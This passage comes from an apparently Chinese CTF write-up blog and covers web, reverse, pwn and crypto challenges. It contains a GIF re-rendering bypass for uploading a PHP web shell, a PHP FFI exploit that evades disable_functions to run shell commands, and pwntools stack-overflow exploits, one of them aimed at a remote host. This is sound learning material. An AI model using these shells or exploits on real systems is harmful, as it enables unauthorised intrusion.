class="line">        <span class="keyword">if</span> ((<span class="variable">$this_file_extension</span> == <span class="string">&quot;gif&quot;</span>) &amp;&amp; (<span class="variable">$this_file_type</span> == <span class="string">&quot;image/gif&quot;</span>)) &#123;</span><br><span class="line">            <span class="comment">// 检查后缀和content-type</span></span><br><span class="line">            <span class="variable">$this_file_name</span> = sha1(date(<span class="string">&#x27;YmdGHs&#x27;</span>) . substr(microtime(<span class="literal">true</span>), <span class="number">11</span>, <span class="number">4</span>) . <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] . <span class="variable">$this_file_name</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$this_file_extension</span>;</span><br><span class="line">            <span class="variable">$this_file_save_path</span> = <span class="variable">$file_location</span> . <span class="variable">$this_file_name</span>;</span><br><span class="line">            <span class="variable">$this_file_decode_data</span> = base64_decode(<span class="variable">$this_file_data</span>);</span><br><span class="line">            file_put_contents(<span class="variable">$this_file_save_path</span>, <span class="variable">$this_file_decode_data</span>);</span><br><span class="line">            <span class="comment">// 给文件重命名</span></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$this_file_type</span> == <span class="string">&quot;image/gif&quot;</span>)&#123;</span><br><span class="line">                <span class="comment">// 使用上传的图片进行二次渲染</span></span><br><span class="line">                <span class="variable">$im</span> = @imagecreatefromgif(<span class="variable">$this_file_save_path</span>);</span><br><span class="line">                @unlink(<span class="variable">$this_file_save_path</span>);</span><br><span class="line">                imagegif(<span class="variable">$im</span>,<span class="variable">$this_file_save_path</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$image</span> = <span class="keyword">new</span> Image();</span><br><span class="line">            <span class="variable">$image</span>-&gt;insert(<span class="variable">$this_file_name</span>);<span class="comment">#在数据库中保存文件名</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">&quot;Location: index.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>选Gif是因为Gif格式的二次渲染比较容易绕，首先先制作一个gif（随便找张图片-&gt;画图打开-&gt;另存为gif即可），然后在文件末尾写个<code>&lt;?php phpinfo();?&gt;</code>，上传，上传后下载回来比较文本，（文本比较工具：<a target="_blank" rel="noopener" href="https://www.scootersoftware.com/download.php">BeyondCompare</a>，也是功能强大的工具，可以比较多种类型文件（纯文本、十六进制等）强推！）发现末尾的一句话没了，但是其他部分都没有变化</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211204111407546.png" alt="image-20211204111407546"></p>
<p>随便找个地方写进<code>&lt;?php phpinfo();?&gt;</code>，上传，通过文件包含可以看到成功解析写入的php代码</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211204124110099.png" alt="image-20211204124110099"></p>
<p>接着写入一句话并上传，执行系统命令<code>cmd=system(&#39;ls&#39;);</code>，没有反应，查看了一下phpinfo的配置，可以发现禁用了大量函数</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211204125706363.png" alt="image-20211204125706363"></p>
<p>其中就包含了system，不过没有禁用<code>print_r</code>和<code>scandir</code>，我们可以先目录遍历一下：<code>cmd=print_r(scandir(&#39;/&#39;));</code></p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211204130917645.png" alt="image-20211204130917645"></p>
<p>发现根目录有两个可疑文件，flag和readflag，问题在于怎么读出flag，在搜常用的disable function bypass（<a target="_blank" rel="noopener" href="https://forum.butian.net/share/473">参考1</a>、<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/263540.html">参考2</a>、<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/208451">参考3</a>）时发现了，当php&gt;7.4且FFI开着时，有个FFI Bypass，这时发现了我们题目的php环境正是7.4且他的FFI是开着的（话说原来FFI全称是Foreign Function Interface，还真是题目的hint…）</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211204125946678.png" alt="image-20211204125946678"></p>
<blockquote>
<p> FFI其实就是一个外部函数接口，让我们可以在php里面调用C代码（先mark下，后期整理）</p>
</blockquote>
<ul>
<li>参考1：<a target="_blank" rel="noopener" href="https://www.mi1k7ea.com/2019/06/07/%E4%BB%8E%E4%B8%80%E9%81%93%E9%A2%98%E7%9C%8BPHP7-4%E7%9A%84FFI%E7%BB%95%E8%BF%87disable-functions/">从RCTF nextphp看PHP7.4的FFI绕过disable_functions</a></li>
<li>参考2：<a target="_blank" rel="noopener" href="https://liloong3t.com/2021/03/08/2021-3-8-ffi-php-kuo-zhan-ren-yi-ming-ling-zhi-xing/">FFI扩展</a> （这个可能更切合本题）</li>
</ul>
<p><strong>FFI EXP</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$ffi</span> = FFI::cdef(<span class="string">&quot;int system(const char *command);&quot;</span>);</span><br><span class="line"><span class="variable">$ffi</span>-&gt;system(<span class="string">&quot;<span class="subst">$cmd</span> &gt; /tmp/123&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">&quot;/tmp/123&quot;</span>);</span><br><span class="line">@unlink(<span class="string">&quot;/tmp/123&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>作用：其实也是一句话木马，cmd参数，传给C语言执行系统命令，并将执行结果重定向到/tmp/123，这有两个原因：一是c语言的system函数执行后无回显，所以需要将执行结果外带；二是需要一个我们有权限读到结果的文件，所以这里选了/tmp目录</p>
<p>效果：post参数传<code>cmd=ls ../../../</code>查看根目录，命令执行成功</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211204133148798.png" alt="image-20211204133148798"></p>
<p>尝试直接<code>cat /flag</code>失败，于是尝试执行readflag，成功读出</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211204133822604.png" alt="image-20211204133822604"></p>
<p>其实这里有点马后炮了，出题人的意思是要先查看权限（whoami发现我们是www-data权限），得知flag读不了，再去执行readflag</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211204134304508.png" alt="image-20211204134304508"></p>
<p>美化一下</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211204134237666.png" alt="image-20211204134237666"></p>
<p>flag：<code>flag&#123;389f6784d8d9e35944001b6c2dd848cc&#125;</code></p>
<blockquote>
<p>Web后记：比赛时最后两题没做出来一开始还有点遗憾，不过后面发现确实给时间也不一定能做出来，还是有些知识点没接触过的，然后不知道有没有人发现我全程没用蚁剑！！毕竟校网有时会拦截蚁剑流量，所以想尽量通过post直接执行shell（毕竟蚁剑本质上也是通过这种方式做事的）</p>
</blockquote>
<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="signin"><a href="#signin" class="headerlink" title="signin"></a>signin</h3><p>拖入ida看main的伪c（将Buf2简化一下）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">size_t</span> v3; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">size_t</span> v4; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> Buf2[<span class="number">32</span>]; <span class="comment">// [rsp+20h] [rbp-60h] BYREF</span></span><br><span class="line">  <span class="keyword">char</span> Str[<span class="number">96</span>]; <span class="comment">// [rsp+40h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="keyword">int</span> v8; <span class="comment">// [rsp+A0h] [rbp+20h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 j; <span class="comment">// [rsp+B0h] [rbp+30h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 i; <span class="comment">// [rsp+B8h] [rbp+38h]</span></span><br><span class="line"></span><br><span class="line">  _main(argc, argv, envp);</span><br><span class="line">  <span class="built_in">memset</span>(Str, <span class="number">0</span>, <span class="keyword">sizeof</span>(Str));</span><br><span class="line">  v8 = <span class="number">0</span>;</span><br><span class="line">  Buf2 = [<span class="number">102</span>,<span class="number">11</span>,<span class="number">104</span>,<span class="number">12</span>,<span class="number">115</span>,<span class="number">1</span>,<span class="number">98</span>,<span class="number">9</span>,<span class="number">98</span>,<span class="number">4</span>,<span class="number">99</span>,<span class="number">13</span>,<span class="number">94</span>,<span class="number">39</span>,<span class="number">70</span>,<span class="number">22</span>,<span class="number">84</span>,<span class="number">32</span>,<span class="number">109</span>,<span class="number">9</span>,<span class="number">114</span>,<span class="number">21</span>,<span class="number">111</span>,<span class="number">28</span>,<span class="number">37</span>,<span class="number">65</span>]</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;input flag: &quot;</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%100s&quot;</span>, Str);</span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">strlen</span>(Str) == <span class="number">26</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>i64; ; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      v3 = <span class="built_in">strlen</span>(Str);</span><br><span class="line">      <span class="keyword">if</span> ( i &gt;= v3 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      Str[i] = <span class="number">2</span> * (i | Str[i]) - i - Str[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">1</span>i64; ; ++j )</span><br><span class="line">    &#123;</span><br><span class="line">      v4 = <span class="built_in">strlen</span>(Str);</span><br><span class="line">      <span class="keyword">if</span> ( j &gt;= v4 )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      Str[j] = <span class="number">2</span> * (~Str[j] &amp; Str[j - <span class="number">1</span>]) - (~Str[j] | Str[j - <span class="number">1</span>]) + (Str[j] | ~Str[j - <span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( <span class="built_in">memcmp</span>(Str, Buf2, <span class="number">0x1A</span>ui64) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;wrong!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;right! &quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;wrong! &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>逻辑：输入的Str，经过两轮for循环计算，若与buf相等，则right，输入的Str即为flag</p>
<p>逆向python脚本：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">by vvmdx</span></span><br><span class="line"><span class="string">2021/11/27 21:09</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">buf = [<span class="number">102</span>,<span class="number">11</span>,<span class="number">104</span>,<span class="number">12</span>,<span class="number">115</span>,<span class="number">1</span>,<span class="number">98</span>,<span class="number">9</span>,<span class="number">98</span>,<span class="number">4</span>,<span class="number">99</span>,<span class="number">13</span>,<span class="number">94</span>,<span class="number">39</span>,<span class="number">70</span>,<span class="number">22</span>,<span class="number">84</span>,<span class="number">32</span>,<span class="number">109</span>,<span class="number">9</span>,<span class="number">114</span>,<span class="number">21</span>,<span class="number">111</span>,<span class="number">28</span>,<span class="number">37</span>,<span class="number">65</span>]</span><br><span class="line">flag = [<span class="number">0</span>]*<span class="number">26</span></span><br><span class="line">tmp = [<span class="number">0</span>]*<span class="number">26</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">re</span>():</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">26</span>):</span><br><span class="line">        Strj = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> buf[j] != <span class="number">2</span> * (~Strj &amp; buf[j-<span class="number">1</span>]) - (~Strj | buf[j-<span class="number">1</span>]) + (Strj | ~buf[j-<span class="number">1</span>]):</span><br><span class="line">            Strj += <span class="number">1</span></span><br><span class="line">        tmp[j] = Strj</span><br><span class="line"></span><br><span class="line">    tmp[<span class="number">0</span>]=buf[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">        Stri = <span class="number">0</span></span><br><span class="line">        <span class="keyword">while</span> tmp[i] != <span class="number">2</span> * (i | Stri) - i - Stri:</span><br><span class="line">            Stri += <span class="number">1</span></span><br><span class="line">        flag[i] = Stri</span><br><span class="line"></span><br><span class="line">    f=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">       f += <span class="built_in">chr</span>(i)</span><br><span class="line">    <span class="built_in">print</span>(f)</span><br><span class="line"></span><br><span class="line">re()</span><br></pre></td></tr></table></figure>
<p>flag：<code>flag&#123;welcome_to_Re_world!&#125;</code></p>
<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="div-overflow"><a href="#div-overflow" class="headerlink" title="div_overflow"></a>div_overflow</h3><ul>
<li>参考：2021强网no_output</li>
</ul>
<p>checksec看下保护</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211128205242304.png" alt="image-20211128205242304"></p>
<p>栈上代码不可执行，其他无保护</p>
<p>ida看一下</p>
<ul>
<li><p>main</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211129094342650.png" alt="image-20211129094342650"></p>
<p>输入v5，v4，执行v5=v5/v4后打印字符串退出</p>
</li>
<li><p>init</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211129094515948.png" alt="image-20211129094515948"></p>
<p>一个时钟，一个信号singnal，表示捕捉到8信号的时候中断并执行backdoor函数</p>
</li>
<li><p>backdoor</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211129094824534.png" alt="image-20211129094824534"></p>
<p>buf数组长度为80（0x50），但read会读0x100</p>
</li>
<li><p>getshell</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211129094851964.png" alt="image-20211129094851964"></p>
<p>弹个shell</p>
</li>
</ul>
<p><strong>思路</strong>：</p>
<ol>
<li>触发8信号（除0或是除法发生溢出）产生中断执行backdoor<ul>
<li>int类型表示范围：-2^31^(-2147483648)~2^31^-1(2147483647)</li>
<li>溢出构造：-2147483648/-1 = 2147483648 大于int最大值，上溢</li>
</ul>
</li>
<li>backdoor给了个栈溢出，可以利用他将返回地址覆盖为getshell函数的地址</li>
</ol>
<p><strong>调试</strong></p>
<ol>
<li><p>断点打到backdoor，除法溢出触发中断</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211129104747180.png" alt="image-20211129104747180"></p>
</li>
<li><p>进入backdoor后，buf为-0x50，也就是buf会从rbp-0x50的位置开始读</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211129113019447.png" alt="image-20211129113019447"></p>
<p>构造一个‘a’*57的字符串（不是58是因为没用pwntool的话回车会算一个字符<del>别骂了别骂了我还是对pwntool交互不熟…</del>），发送后发现RBP已经被修改为aaaaaaa\n，</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211129112756506.png" alt="image-20211129112756506"></p>
<p>接着就是leave和ret</p>
</li>
<li><p>将上一步的payload修改为‘a’*58+0x4007c7（getshell的地址）（当然这里next的话会出错，因为多了个换行符），可以看到rsp的值被覆盖</p>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211129113933119.png" alt="image-20211129113933119"></p>
</li>
<li><p>本地程序测试一下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p =process(<span class="string">&#x27;./div_overflow&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x50</span>+<span class="number">8</span>)+p64(<span class="number">0x4007c7</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please input the first key :&#x27;</span>,<span class="string">&#x27;-2147483648&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;And the second key :&#x27;</span>,<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Hero, please leave your name :&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211129114224664.png" alt="image-20211129114224664"></p>
<p>getshell成功</p>
</li>
<li><p>远程打</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;35.229.138.83&quot;</span>,<span class="number">14056</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x58</span>)+p64(<span class="number">0x4007cb</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;Please input the first key :&#x27;</span>,<span class="string">&#x27;-2147483648&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;And the second key :&#x27;</span>,<span class="string">&#x27;-1&#x27;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Hero, please leave your name :&quot;</span>,payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/vvmdx/myImageForPicgo@main//img/image-20211129115520601.png" alt="image-20211129115520601"></p>
<p>这好奇怪，本地用0x4007c7是打得通的，但是远程打不通，要用0x4007c8或者0x4007cb才能通…mark一下后期再找原因</p>
</li>
</ol>
<p>flag：<code>flag&#123;DIvSiOn_So_EAsy_YeS_vwtub468&#125;</code></p>
<h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="proof-of-work"><a href="#proof-of-work" class="headerlink" title="proof_of_work"></a>proof_of_work</h3><p>爆破sha-256前4位</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">String = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pow</span>():</span></span><br><span class="line">    behind = <span class="string">&quot;98BUbI5iG036&quot;</span></span><br><span class="line">    hashValue = <span class="string">&quot;6b18dccbb71a096c46d9412876c56a2da6ba05924ff735f557db22cc4f957084&quot;</span></span><br><span class="line">    font = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> chr1 <span class="keyword">in</span> String:</span><br><span class="line">        <span class="keyword">for</span> chr2 <span class="keyword">in</span> String:</span><br><span class="line">            <span class="keyword">for</span> chr3 <span class="keyword">in</span> String:</span><br><span class="line">                <span class="keyword">for</span> chr4 <span class="keyword">in</span> String:</span><br><span class="line">                    <span class="keyword">if</span> hashlib.sha256((chr1+chr2+chr3+chr4+behind).encode()).hexdigest()==hashValue:</span><br><span class="line">                        <span class="built_in">print</span>(chr1+chr2+chr3+chr4)</span><br><span class="line">                        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">pow</span>()</span><br></pre></td></tr></table></figure>
<p>flag：<code>flag&#123;f8f0e603-8a2f-4870-b81d-972ab039cfe9&#125;</code></p>
<h3 id="RSAStudy"><a href="#RSAStudy" class="headerlink" title="RSAStudy"></a>RSAStudy</h3><ul>
<li>m1：给了c、d、n ==&gt; $m = c^{d} mod n$</li>
<li>m2：n太小，直接<a target="_blank" rel="noopener" href="http://www.factordb.com/index.php?query=1048902211749325097416799151481">在线分解</a>出p、q</li>
<li>m3：n特别大，e特别小，因为 $c = m^{e} mod n$ ，m^e^ 若没n大可以直接对c开e次方得到m</li>
<li>m4：e是20位的素数，直接遍历所有20位的素数，尝试解密，若解密后有不可见字符则跳过</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">by vvmdx</span></span><br><span class="line"><span class="string">2021/11/28 12:41</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes,bytes_to_long</span><br><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">round1</span>():</span></span><br><span class="line">    n=<span class="number">95845527018839717086294472801605969145676365231323758473521266785720550109591787727210641248040429782803493016018678284969424032513894656011258597991697123040906458428931870959461677035741748707260523109808863069423504777871574127439549082056993303443656505762993233175718191683881904506062498915962417071789</span></span><br><span class="line">    c=<span class="number">2743851142411869248379118038924192049907457070259670722109251021395015205941929560302259759641549680271828782036817328489468187264127325193565012371464631997314398207482280969688296263968695775596468250952244684716979339562706861283018153500950741985494526881474375594286490427451426606421116634452945047605</span></span><br><span class="line">    d=<span class="number">65537</span></span><br><span class="line">    m=<span class="built_in">pow</span>(c,d,n)</span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(m)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">round2</span>():</span></span><br><span class="line">    c = <span class="number">274750938859955592330167122790</span></span><br><span class="line">    n = <span class="number">1048902211749325097416799151481</span></span><br><span class="line">    p = <span class="number">974807353794173</span></span><br><span class="line">    q = <span class="number">1076009744557997</span></span><br><span class="line">    e = <span class="number">65537</span></span><br><span class="line">    phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    d=primefac.modinv(e,phi)%phi</span><br><span class="line">    m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(m)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">round3</span>():</span></span><br><span class="line">    n = <span class="number">18640453489846331794602191747384447703024621993552658501476696307679684008154005802771261130041658000561889540274009131700240237659287434541418323028846854355269787944453313835791228722277309297931161110883060221995194685589684429615817460852313446831810137461857903760896607816014479990108841010359179102028416135867395092471836379674595823743903909119762066042254313890615403656895858669191932404241413414070325709045864882216481803888089008965624519610385223131745453733259902207802062978354791651088711792816246223044537642881905697525313174348622880095283912119417292107480433157927992842659096964533277137708767</span></span><br><span class="line">    c = <span class="number">13969703385633449917197462425856544850480430207326112090281028915798236467064796479689673052775063674313997314578301227112023113231160584900205532344903858838917789706414684555675461637374321137483769853828107957693180026066461057479661682997954262743</span></span><br><span class="line">    e = <span class="number">5</span></span><br><span class="line">    m = gp.iroot(c, e)[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(m)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">round4</span>():</span></span><br><span class="line">    c = <span class="number">48550724605239802490802735574619837128533770018799115422170750355571787084837240190282906968166893355816737962546909133079904697609749525658204283046328033928358557965523296167973202608220777994289583796713172282988376178189667994774528015752536586401007481994828159257922229204681186681408471675557339260115</span></span><br><span class="line">    n = <span class="number">148275690073399102757048819433714926762037969527548279777577605259904188326232564956361831483283388786152723842541087715605543367891265806905933557709191406802930750432995226932444699925443718361381501104621526480808485597229438878264469665328020014789196441181019668546309454418367288885685595286146455127111</span></span><br><span class="line">    p = <span class="number">12385419895051073291767171828313134764541962212376482960822734800239044848678560002976975547592969326422618567674410577670493481798328745250071880326343129</span></span><br><span class="line">    q = n / p</span><br><span class="line">    phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">    e = <span class="number">2</span>**<span class="number">19</span></span><br><span class="line">    <span class="keyword">while</span> gp.is_prime(e) != <span class="literal">True</span>:</span><br><span class="line">        e += <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> e &lt; <span class="number">2</span>**<span class="number">20</span>:</span><br><span class="line">        d = gp.invert(e, phi)</span><br><span class="line">        m = <span class="built_in">pow</span>(c, d, 